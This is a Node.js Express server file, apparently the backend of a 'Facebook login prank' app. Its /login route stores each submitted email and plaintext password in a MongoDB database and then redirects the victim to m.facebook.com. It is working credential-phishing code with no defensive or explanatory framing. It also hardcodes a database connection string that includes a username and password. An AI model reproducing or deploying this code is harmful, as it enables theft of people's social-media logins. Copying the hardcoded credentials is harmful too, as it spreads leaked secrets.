var express = require('express');
var app = express();
var port = process.env.PORT || 3000;
var mongoose = require('mongoose');
var User = require('./User');




var bodyParser = require('body-parser');
// var session = require('express-session');

// var configDB = require('./config/database');

//const router = express.Router();

mongoose.connect('mongodb://steephenvrs3:suspecious8086@ds249530.mlab.com:49530/fbloginprankapp');

// require('./config/passport')(passport);



app.use(bodyParser.json());
app.use(bodyParser.urlencoded({
    extended: true
}));

// app.set('view engine', 'jade');
app.get('/',function(req,res){
    res.sendfile('index.html');
})

app.post('/login',function(req,res){
    var newuser = new User({
                     email: req.body.email,
                   password: req.body.pass
                 });
    newuser.save().then(data=>{
        console.log(data);
        res.redirect('www.m.facebook.com');
    })

})

// app.use(session({
//     secret: 'thisismysecret',
//     resave: true,
//     saveUninitialized: true
// }));
// app.use(passport.initialize());
// app.use(passport.session());
// app.use(flash());

// require('./app/routes.js')(app, passport);
app.listen(port);
console.log('server listening on port ' + port);